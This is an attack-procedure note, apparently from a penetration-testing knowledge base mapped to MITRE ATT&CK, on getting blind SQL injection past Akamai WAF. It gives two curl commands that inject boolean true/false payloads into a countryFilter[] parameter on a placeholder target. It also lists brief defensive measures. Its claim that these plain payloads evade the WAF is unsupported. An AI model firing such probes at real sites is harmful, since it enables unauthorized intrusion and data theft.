---
tags:
  - waf-bypass
  - sql-injection
type: procedure
tools:
  - '[[tools/Akamai-WAF]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
id: 5d80b094-4df7-4ee4-b04d-f7c405df219a
created_at: '2025-12-11T03:48:05.943Z'
updated_at: '2025-12-11T03:48:05.943Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Bypass WAF with SQL Payload

## Summary

This procedure crafts SQL injection payloads designed to evade Akamai WAF detection, enabling blind SQLi exploitation on protected endpoints.

## Description

Targeting a web application with Akamai WAF, this method uses techniques like comment injection or boolean logic to slip past signature-based detection. It applies to scenarios where direct SQLi is blocked, allowing confirmation of vulnerability without triggering alerts.

## Requirements

1. Known vulnerable parameter (e.g., countryFilter[])
2. Understanding of WAF evasion techniques
3. HTTP client for testing

## Defense

Defensive measures and detection strategies:

- Update WAF rules to catch evasion techniques
- Use behavioral analysis for anomaly detection

## Objectives

1. Evade WAF blocking
2. Confirm blind injection via response differences
3. Enable data extraction

## Instructions

### Step 1: Craft True Condition Payload

**Context**: Test a payload that should return true without WAF interference.

**Command** ([[commands/curl-inject-sqli-payload]]):

```bash
curl "https://target.com/report_xml.php?countryFilter[]=1' AND 1=1 --"
```

> Observe if the response matches a valid query.

### Step 2: Craft False Condition Payload

**Context**: Compare with a false condition to confirm boolean blind behavior.

**Command** ([[commands/curl-inject-sqli-payload]]):

```bash
curl "https://target.com/report_xml.php?countryFilter[]=1' AND 1=2 --"
```

> Differences in responses indicate successful bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-inject-sqli-payload]]

## Tools Used

- [[commands/curl-inject-sqli-payload]]
- [[tools/Akamai-WAF]]

## Tags

- [[tools/Akamai-WAF]]
- #sql-injection
